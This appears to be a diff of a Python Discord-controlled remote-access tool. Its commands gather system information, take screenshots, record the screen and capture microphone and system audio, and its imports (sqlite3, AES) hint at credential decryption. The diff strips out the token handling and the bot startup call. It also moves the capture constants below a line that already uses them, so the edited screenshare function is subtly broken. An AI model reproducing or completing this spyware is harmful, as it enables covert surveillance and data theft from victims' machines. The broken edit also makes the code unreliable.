@@ -22,38 +22,14 @@ import sqlite3
 import json
 from Crypto.Cipher import AES
 import shutil
-import sys 
 
-
-if len(sys.argv) < 2:
-    print("Please provide a valid Discord bot token as a command-line argument.")
-    sys.exit(1)
-
-TOKEN = sys.argv[1]
-SCREEN_SHARE_DURATION = 15
-SCREEN_CAPTURE_FPS = 15
-SCREEN_CAPTURE_FILENAME = 'screen_capture.mp4'
-VOICE_CHANNEL_ID = 1129440490413109331
-VOICE_CAPTURE_DURATION = 15
-SYSTEM_AUDIO_DEVICE_INDEX = 0
-MICROPHONE_DEVICE_INDEX = 1
-AUDIO_OUTPUT_FILENAME = 'voice_capture.wav'
-screen_width, screen_height = pyautogui.size()
-
-intents = discord.Intents.default()
-intents.typing = True
-intents.presences = True
-intents.message_content = True
 bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
 
 p = pyaudio.PyAudio()
 
-
 @bot.event
 async def on_ready():
     print(f'Logged in as {bot.user.name}')
-
-
 
 @bot.command()
 async def sysinfo(ctx):
@@ -137,6 +113,10 @@ async def screenshot(ctx):
 async def screenshare(ctx):
     await ctx.send("Starting screen share...Wait 15 seconds")
     screen_size = (screen_width, screen_height)
+    screen_width, screen_height = pyautogui.size()
+    SCREEN_SHARE_DURATION = 15
+    SCREEN_CAPTURE_FPS = 15
+    SCREEN_CAPTURE_FILENAME = 'screen_capture.mp4'
     screen_capture = imageio.get_writer(SCREEN_CAPTURE_FILENAME, fps=SCREEN_CAPTURE_FPS)
 
     start_time = time.time()
@@ -374,6 +354,3 @@ def main():
 async def on_disconnect():
     await bot.http.session.close()
 
-
-print('Starting the bot...')
-bot.run(TOKEN)
